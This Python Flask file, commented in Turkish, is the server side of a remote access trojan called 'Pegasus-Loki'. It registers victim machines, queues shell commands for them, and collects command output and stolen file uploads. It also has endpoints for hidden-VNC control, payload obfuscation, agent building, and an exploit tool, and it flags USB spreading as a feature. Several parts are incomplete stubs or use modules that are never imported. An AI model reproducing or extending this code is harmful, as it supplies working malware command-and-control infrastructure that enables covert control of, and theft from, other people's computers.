#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus-Loki Entegre API
Pegasus RAT özelliklerini destekleyen gelişmiş API endpoints
"""

import os
import json
import base64
import hashlib
from datetime import datetime, timedelta
from flask import Blueprint, request, jsonify, abort, url_for, current_app, render_template, redirect
from werkzeug.utils import secure_filename
from markupsafe import escape
import traceback

# Pegasus şifreleme modülü
try:
    import sys
    sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'agent'))
    from pegasus_crypto import PegasusAES, PegasusConfig
    PEGASUS_CRYPTO_AVAILABLE = True
except ImportError:
    PEGASUS_CRYPTO_AVAILABLE = False
    print("Pegasus crypto modülü yüklenemedi")

# Pegasus obfuscation module
try:
    import sys
    sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'agent'))
    from pegasus_obfuscation import obfuscate_payload
    PEGASUS_OBFUSCATION_AVAILABLE = True
except ImportError:
    PEGASUS_OBFUSCATION_AVAILABLE = False
    print("Pegasus obfuscation module not available")

# Veritabanı modelleri
try:
    from .models import Agent, Command, db, User
except ImportError:
    try:
        from models import Agent, Command, db, User
    except ImportError:
        print("Veritabanı modelleri yüklenemedi")

# Gerekli yardımcı fonksiyonlar
try:
    from .webui import require_admin, hash_and_salt
except ImportError:
    try:
        from webui import require_admin, hash_and_salt
    except ImportError:
        print("Web UI modülleri yüklenemedi")
        # Gerekli fonksiyonları tanımla
        def require_admin(func):
            def wrapper(*args, **kwargs):
                return func(*args, **kwargs)
            return wrapper

pegasus_api = Blueprint('pegasus_api', __name__, template_folder='webui/templates', static_folder='webui/static')

# Pegasus şifreleme nesnesi (global)
pegasus_crypto = None

def init_pegasus_crypto():
    """
    Pegasus şifreleme sistemini başlatır
    """
    global pegasus_crypto
    try:
        if PEGASUS_CRYPTO_AVAILABLE and not pegasus_crypto:
            config = PegasusConfig()
            pegasus_crypto = PegasusAES(config.master_key)
            print("Pegasus şifreleme sistemi başlatıldı")
            return True
    except Exception as e:
        print(f"Pegasus şifreleme başlatma hatası: {e}")
    return False

def decrypt_if_encrypted(data):
    """
    Eğer veri şifrelenmiş ise çözer
    """
    global pegasus_crypto
    
    if not pegasus_crypto or not isinstance(data, dict):
        return data
    
    try:
        # Şifrelenmiş veri kontrolü
        if 'encrypted_data' in data:
            decrypted = pegasus_crypto.decrypt(data['encrypted_data'])
            return json.loads(decrypted)
        elif 'encrypted_output' in data:
            return {'output': pegasus_crypto.decrypt(data['encrypted_output'])}
    except Exception as e:
        print(f"Şifre çözme hatası: {e}")
    
    return data

def get_or_create_agent(agent_id, agent_info=None):
    """
    Agent'ı bulur veya oluşturur - Geliştirilmiş versiyon
    """
    try:
        # Mevcut agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()

        if not agent:
            # Yeni agent oluştur
            agent = Agent(agent_id=agent_id)
            db.session.add(agent)
            print(f"[+] Yeni agent oluşturuldu: {agent_id}")

        # Agent bilgilerini güncelle
        if agent_info:
            if 'hostname' in agent_info:
                agent.hostname = agent_info['hostname']
            if 'username' in agent_info:
                agent.username = agent_info['username']
            if 'os' in agent_info:
                agent.operating_system = agent_info['os']
            if 'ip' in agent_info:
                agent.remote_ip = agent_info['ip']
            if 'location' in agent_info:
                agent.geolocation = agent_info['location']
        
        agent.last_online = datetime.utcnow()
        agent.status = 'online'
        db.session.commit()
        
        return agent
    except Exception as e:
        db.session.rollback()
        print(f"Agent oluşturma/güncelleme hatası: {e}")
        return None

@pegasus_api.route('/<agent_id>/hello', methods=['POST'])
def agent_hello(agent_id):
    """
    Gelişmiş agent hello endpoint'i
    Pegasus şifreleme ve gelişmiş özellikler destekler
    """
    try:
        # Şifreleme sistemini başlat
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        # Request verisini al ve şifresini çöz
        if request.is_json:
            data = request.get_json()
            agent_info = decrypt_if_encrypted(data)
        else:
            agent_info = {
                'platform': request.form.get('platform', 'Unknown'),
                'hostname': request.form.get('hostname', 'Unknown'),
                'username': request.form.get('username', 'Unknown')
            }
        
        # Agent'ı bul veya oluştur
        agent = get_or_create_agent(agent_id, agent_info)
        if not agent:
            return "Agent oluşturulamadı", 500
        
        # Bekleyen komutları kontrol et
        pending_commands = Command.query.filter_by(
            agent_id=agent.id,
            executed=False
        ).order_by(Command.timestamp.asc()).first()
        
        if pending_commands:
            # Komutu işaretle (opsiyonel)
            # pending_commands.executed = True
            # db.session.commit()
            return pending_commands.cmdline
        
        return ""
        
    except Exception as e:
        print(f"Agent hello hatası: {e}")
        traceback.print_exc()
        return "Sunucu hatası", 500

@pegasus_api.route('/<agent_id>/report', methods=['POST'])
def agent_report(agent_id):
    """
    Gelişmiş agent rapor endpoint'i
    Şifrelenmiş çıktıları destekler
    """
    try:
        # Agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return "Agent bulunamadı", 404
        
        # Çıktıyı al ve şifresini çöz
        if request.is_json:
            data = request.get_json()
            decrypted_data = decrypt_if_encrypted(data)
            output = decrypted_data.get('output', '')
        else:
            output = request.form.get('output', '')
            # Şifrelenmiş form verisi kontrolü
            encrypted_output = request.form.get('encrypted_output')
            if encrypted_output and pegasus_crypto:
                try:
                    output = pegasus_crypto.decrypt(encrypted_output)
                except:
                    pass
        
        # Çıktıyı agent'a ekle
        if output:
            agent.output += escape(output)
            agent.last_online = datetime.utcnow()
            db.session.commit()
        
        return "OK"
        
    except Exception as e:
        print(f"Agent report hatası: {e}")
        return "Sunucu hatası", 500

@pegasus_api.route('/<agent_id>/upload', methods=['POST'])
def agent_upload(agent_id):
    """
    Gelişmiş dosya yükleme endpoint'i
    """
    try:
        # Agent'ı bul
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return "Agent bulunamadı", 404
        
        if 'uploaded' not in request.files:
            return "Dosya bulunamadı", 400
        
        file = request.files['uploaded']
        if file.filename == '':
            return "Dosya adı boş", 400
        
        # Güvenli dosya adı
        filename = secure_filename(file.filename)
        
        # Agent klasörü
        agent_dir = agent.agent_id
        upload_dir = current_app.config.get('UPLOAD_FOLDER', 'server/webui/static/uploads')
        store_dir = os.path.join(upload_dir, agent_dir)
        
        # Klasörü oluştur
        os.makedirs(store_dir, exist_ok=True)
        
        # Dosya yolu
        file_path = os.path.join(store_dir, filename)
        
        # Aynı isimde dosya varsa prefix ekle
        counter = 1
        original_filename = filename
        while os.path.exists(file_path):
            name, ext = os.path.splitext(original_filename)
            filename = f"{name}_{counter}{ext}"
            file_path = os.path.join(store_dir, filename)
            counter += 1
        
        # Dosyayı kaydet
        file.save(file_path)
        
        # Download linki oluştur
        download_link = url_for('webui.uploads', path=f"{agent_dir}/{filename}")
        
        # Agent çıktısına ekle
        file_info = f'[*] Dosya yüklendi: <a target="_blank" href="{download_link}">{filename}</a> ({os.path.getsize(file_path)} bytes)\n'
        agent.output += file_info
        agent.last_online = datetime.utcnow()
        db.session.commit()
        
        return "Yükleme başarılı"
        
    except Exception as e:
        print(f"Dosya yükleme hatası: {e}")
        return "Yükleme hatası", 500

@pegasus_api.route('/<agent_id>/status', methods=['GET', 'POST'])
def agent_status(agent_id):
    """
    Agent durumu endpoint'i
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        if request.method == 'POST':
            # Durum güncelleme
            data = request.get_json() or {}
            decrypted_data = decrypt_if_encrypted(data)
            
            if 'status' in decrypted_data:
                agent.status = decrypted_data['status']
            
            agent.last_online = datetime.utcnow()
            db.session.commit()
        
        # Durum bilgilerini döndür
        return jsonify({
            'agent_id': agent.agent_id,
            'hostname': agent.hostname,
            'username': agent.username,
            'platform': agent.operating_system,
            'status': agent.status,
            'last_online': agent.last_online.isoformat() if agent.last_online else None,
            'is_online': agent.is_online()
        })
        
    except Exception as e:
        print(f"Agent status hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/services', methods=['GET', 'POST'])
def agent_services(agent_id):
    """
    Agent servis durumu endpoint'i (HVNC, USB, Security)
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        if request.method == 'POST':
            # Servis durumu güncelleme
            data = request.get_json() or {}
            decrypted_data = decrypt_if_encrypted(data)
            
            services_info = decrypted_data.get('services', {})
            
            # Servis bilgilerini agent çıktısına ekle
            if services_info:
                service_report = f"[*] Servis Durumu Güncellendi:\n{json.dumps(services_info, indent=2)}\n"
                agent.output += service_report
                agent.last_online = datetime.utcnow()
                db.session.commit()
            
            return jsonify({'status': 'updated'})
        
        # Mevcut servis durumunu döndür (agent'tan son rapor)
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Agent services hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/hvnc', methods=['POST'])
def agent_hvnc_control(agent_id):
    """
    HVNC kontrol endpoint'i
    """
    try:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent bulunamadı'}), 404
        
        data = request.get_json() or {}
        action = data.get('action')
        
        if action == 'start':
            host = data.get('host', '127.0.0.1')
            port = data.get('port', 5900)
            command = f"hvnc start {host} {port}"
        elif action == 'stop':
            command = "hvnc stop"
        elif action == 'status':
            command = "hvnc status"
        else:
            return jsonify({'error': 'Geçersiz aksiyon'}), 400
        
        # Komutu agent'a gönder
        agent.push_command(command)
        
        return jsonify({
            'status': 'command_sent',
            'command': command,
            'action': action
        })
        
    except Exception as e:
        print(f"HVNC kontrol hatası: {e}")
        return jsonify({'error': 'Sunucu hatası'}), 500

@pegasus_api.route('/<agent_id>/encrypt', methods=['POST'])
def encrypt_data(agent_id):
    """
    Veri şifreleme endpoint'i
    """
    try:
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        if not pegasus_crypto:
            return jsonify({'error': 'Şifreleme mevcut değil'}), 400
        
        data = request.get_json() or {}
        plaintext = data.get('data')
        
        if not plaintext:
            return jsonify({'error': 'Şifrelenecek veri gerekli'}), 400
        
        encrypted = pegasus_crypto.encrypt(plaintext)
        
        return jsonify({
            'encrypted_data': encrypted,
            'status': 'success'
        })
        
    except Exception as e:
        print(f"Şifreleme hatası: {e}")
        return jsonify({'error': 'Şifreleme hatası'}), 500

@pegasus_api.route('/<agent_id>/decrypt', methods=['POST'])
def decrypt_data(agent_id):
    """
    Veri şifre çözme endpoint'i
    """
    try:
        if not pegasus_crypto:
            init_pegasus_crypto()
        
        if not pegasus_crypto:
            return jsonify({'error': 'Şifre çözme mevcut değil'}), 400
        
        data = request.get_json() or {}
        encrypted_data = data.get('encrypted_data')
        
        if not encrypted_data:
            return jsonify({'error': 'Şifrelenmiş veri gerekli'}), 400
        
        decrypted = pegasus_crypto.decrypt(encrypted_data)
        
        return jsonify({
            'decrypted_data': decrypted,
            'status': 'success'
        })
        
    except Exception as e:
        print(f"Şifre çözme hatası: {e}")
        return jsonify({'error': 'Şifre çözme hatası'}), 500

@pegasus_api.route('/agents/stats', methods=['GET'])
def agents_stats():
    """
    Agent istatistikleri endpoint'i
    """
    try:
        # Toplam agent sayısı
        total_agents = Agent.query.count()
        
        # Online agent sayısı (son 5 dakikada görülen)
        five_minutes_ago = datetime.utcnow() - timedelta(minutes=5)
        online_agents = Agent.query.filter(
            Agent.last_online >= five_minutes_ago
        ).count()
        
        # Platform dağılımı
        platforms = db.session.query(
            Agent.operating_system,
            db.func.count(Agent.id)
        ).group_by(Agent.operating_system).all()

        platform_stats = {}
        for platform, count in platforms:
            # None değerlerini 'Unknown' olarak değiştir
            platform_key = platform if platform is not None else 'Unknown'
            platform_stats[platform_key] = count
        
        return jsonify({
            'total_agents': total_agents,
            'online_agents': online_agents,
            'offline_agents': total_agents - online_agents,
            'platform_distribution': platform_stats,
            'last_updated': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        print(f"İstatistik hatası: {e}")
        return jsonify({'error': 'İstatistik hatası'}), 500

@pegasus_api.route('/system/info', methods=['GET'])
def system_info():
    """
    Sistem bilgileri endpoint'i
    """
    try:
        return jsonify({
            'server_version': '2.0-pegasus',
            'crypto_available': PEGASUS_CRYPTO_AVAILABLE,
            'crypto_initialized': pegasus_crypto is not None,
            'features': {
                'encryption': PEGASUS_CRYPTO_AVAILABLE,
                'hvnc': True,
                'usb_spread': True,
                'security_checks': True
            },
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        print(f"Sistem bilgisi hatası: {e}")
        return jsonify({'error': 'Sistem bilgisi hatası'}), 500

# Başlatma fonksiyonu
def init_pegasus_api(app):
    """
    Pegasus API'yi Flask uygulamasına kaydeder
    """
    try:
        # Şifreleme sistemini başlat
        init_pegasus_crypto()
        
        # Blueprint'i kaydet
        app.register_blueprint(pegasus_api, url_prefix='/pegasus')
        
        print("Pegasus API başarıyla kaydedildi")
        return True
        
    except Exception as e:
        print(f"Pegasus API kayıt hatası: {e}")
        return False

# Test endpoint'i
@pegasus_api.route('/test', methods=['GET'])
def test_endpoint():
    """
    API test endpoint'i
    """
    return jsonify({
        'status': 'ok',
        'message': 'Pegasus API çalışıyor',
        'crypto_available': PEGASUS_CRYPTO_AVAILABLE,
        'timestamp': datetime.utcnow().isoformat()
    })

@pegasus_api.route('/obfuscate', methods=['POST'])
def obfuscate_file():
    """
    Obfuscate a file
    """
    if not PEGASUS_OBFUSCATION_AVAILABLE:
        return jsonify({'error': 'Obfuscation module not available'}), 500
    
    try:
        # Get the file to obfuscate
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
            
        # Save the file temporarily
        temp_dir = tempfile.mkdtemp()
        input_path = os.path.join(temp_dir, file.filename)
        file.save(input_path)
        
        # Obfuscate the file
        output_path = input_path + ".obfuscated"
        success = obfuscate_payload(input_path, output_path)
        
        if success:
            # Return the obfuscated file
            return send_file(output_path, as_attachment=True, attachment_filename=f"obfuscated_{file.filename}")
        else:
            return jsonify({'error': 'Failed to obfuscate file'}), 500
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    finally:
        # Clean up temporary files
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# Ana sayfa - Pegasus kontrol paneli
@pegasus_api.route('/')
@require_admin
def index():
    return render_template('index.html')

# Root route to redirect to login or index
@pegasus_api.route('/api')
def api_root():
    return redirect(url_for('pegasus_api.login'))

# Agent listesi
@pegasus_api.route('/agents')
@require_admin
def agents():
    agents = Agent.query.all()
    return render_template('agent_list.html', agents=agents)

# Agent detay sayfası
@pegasus_api.route('/agents/<agent_id>')
@require_admin
def agent_detail(agent_id):
    agent = Agent.query.filter_by(agent_id=agent_id).first_or_404()
    return render_template('agent_detail.html', agent=agent)

# Agent konsolu
@pegasus_api.route('/agents/<agent_id>/console')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.filter_by(agent_id=agent_id).first_or_404()
    return render_template('agent_console.html', agent=agent)

# Icarus kontrol paneli
@pegasus_api.route('/icarus')
@require_admin
def icarus_control():
    return render_template('icarus_control.html')

# HVNC aracı
@pegasus_api.route('/hvnc')
@require_admin
def hvnc_tool():
    return render_template('hvnc_tool.html')

# Pantheon aracı
@pegasus_api.route('/pantheon')
@require_admin
def pantheon_tool():
    return render_template('pantheon_tool.html')

# Obfuscation aracı
@pegasus_api.route('/obfuscation')
@require_admin
def obfuscation_tool():
    return render_template('obfuscation_tool.html')

# Exploit aracı
@pegasus_api.route('/exploit')
@require_admin
def exploit_tool():
    return render_template('exploit_tool.html')

# Web tarayıcı
@pegasus_api.route('/scanner')
@require_admin
def web_scanner():
    return render_template('web_scanner.html')

# Sistem monitörü
@pegasus_api.route('/monitor')
@require_admin
def system_monitor():
    return render_template('system_monitor.html')

# Agent builder
@pegasus_api.route('/builder')
@require_admin
def agent_builder():
    return render_template('agent_builder.html')

# IntelX arama
@pegasus_api.route('/intelx')
@require_admin
def intelx_search():
    return render_template('intelx_search.html')

# Login sayfası
@pegasus_api.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            user = User.query.filter_by(username=username).first()
            if user:
                # Şifre doğrulama
                password_hash = hashlib.sha256()
                password_hash.update((user.salt + password).encode('utf-8'))
                if password_hash.hexdigest() == user.password:
                    session['username'] = username
                    return redirect(url_for('pegasus_api.index'))
        
        return render_template('login.html', error='Invalid credentials')
    
    return render_template('login.html')

# Şifre oluşturma
@pegasus_api.route('/create_password', methods=['GET', 'POST'])
def create_password():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            # Şifre hash ve salt oluştur
            password_hash, salt = hash_and_salt(password)
            
            # Kullanıcı oluştur/güncelle
            user = User.query.filter_by(username=username).first()
            if not user:
                user = User(username=username)
                db.session.add(user)
            
            user.password = password_hash
            user.salt = salt
            db.session.commit()
            
            return redirect(url_for('pegasus_api.login'))
    
    return render_template('create_password.html')

@pegasus_api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmd'])
    return ''

@pegasus_api.route('/<agent_id>/bts_exploit', methods=['POST'])
@require_admin
def bts_exploit(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    # Get the command from the request
    command = request.json.get('command')
    if command:
        agent.push_command(command)
    return '', 204

@pegasus_api.route('/agent_get_commands', methods=['GET'])
def agent_get_commands():
    """
    Agent'ın çalıştırması için bekleyen komutları döndürür
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Agent ID is required'}), 400
        
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    # Bekleyen komutları al
    commands = Command.query.filter_by(agent_id=agent.id, executed=False).all()
    
    # Komutları JSON formatında döndür
    command_list = []
    for cmd in commands:
        command_list.append({
            'id': cmd.id,
            'cmdline': cmd.cmdline
        })
        
        # Komutu çalıştırıldı olarak işaretle
        cmd.executed = True
        db.session.add(cmd)
    
    db.session.commit()
    
    return jsonify({
        'commands': command_list
    })

@pegasus_api.route('/agent_send_output', methods=['POST'])
def agent_send_output():
    """
    Agent'ın komut çıktısını alır ve kaydeder
    """
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    output = data.get('output')
    
    if not all([agent_id, command_id, output]):
        return jsonify({'error': 'Missing required fields'}), 400
    
    # Agent ve komutu bul
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    command = Command.query.filter_by(id=command_id, agent_id=agent.id).first()
    if not command:
        return jsonify({'error': 'Command not found'}), 404
    
    # Çıktıyı kaydet
    command.output = output
    command.completed_at = datetime.utcnow()
    db.session.add(command)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@pegasus_api.route('/check_in', methods=['POST'])
def agent_check_in():
    """
    Agent check-in endpoint - register or update agent status
    """
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Agent ID is required'}), 400
    
    # Decrypt if needed
    data = decrypt_if_encrypted(data)
    
    # Agent'ı oluştur veya güncelle
    agent = get_or_create_agent(agent_id, {
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'ip': request.remote_addr,
        'location': data.get('location', 'Unknown')
    })
    
    if not agent:
        return jsonify({'error': 'Failed to register agent'}), 500
    
    return jsonify({
        'status': 'checked_in',
        'agent_id': agent.agent_id
    })


# Pegasus özel endpoint'leri

# Icarus yapılandırma
@pegasus_api.route('/api/icarus/configure', methods=['POST'])
@require_admin
def configure_icarus():
    try:
        data = request.get_json()
        # Icarus yapılandırma işlemleri
        return jsonify({'status': 'success', 'message': 'Icarus configured successfully'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Icarus toggle
@pegasus_api.route('/api/icarus/toggle', methods=['POST'])
@require_admin
def toggle_icarus():
    try:
        data = request.get_json()
        enabled = data.get('enabled', False)
        # Icarus toggle işlemleri
        return jsonify({'status': 'success', 'enabled': enabled})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# HVNC başlat
@pegasus_api.route('/api/hvnc/start', methods=['POST'])
@require_admin
def start_hvnc():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        # HVNC başlatma işlemleri
        return jsonify({'status': 'success', 'message': f'HVNC started for agent {agent_id}'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Pantheon başlat
@pegasus_api.route('/api/pantheon/start', methods=['POST'])
@require_admin
def start_pantheon():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        # Pantheon başlatma işlemleri
        return jsonify({'status': 'success', 'message': f'Pantheon started for agent {agent_id}'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Obfuscation işlemi
@pegasus_api.route('/api/obfuscate', methods=['POST'])
@require_admin
def obfuscate_code():
    try:
        if not PEGASUS_OBFUSCATION_AVAILABLE:
            return jsonify({'status': 'error', 'message': 'Obfuscation module not available'}), 500
            
        data = request.get_json()
        code = data.get('code', '')
        if not code:
            return jsonify({'status': 'error', 'message': 'Code is required'}), 400
            
        # Obfuscation işlemi
        obfuscated_code = obfuscate_payload(code)
        return jsonify({'status': 'success', 'obfuscated_code': obfuscated_code})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Agent builder
@pegasus_api.route('/api/build', methods=['POST'])
@require_admin
def build_agent():
    try:
        data = request.get_json()
        # Agent oluşturma işlemleri
        return jsonify({'status': 'success', 'message': 'Agent build started', 'build_id': '12345'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API health check
@pegasus_api.route('/api/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'crypto_available': PEGASUS_CRYPTO_AVAILABLE,
        'obfuscation_available': PEGASUS_OBFUSCATION_AVAILABLE
    })

# Register the initialization function to run with the app
@pegasus_api.record_once
def record(state):
    # This will be called once when the blueprint is registered
    init_pegasus_crypto()
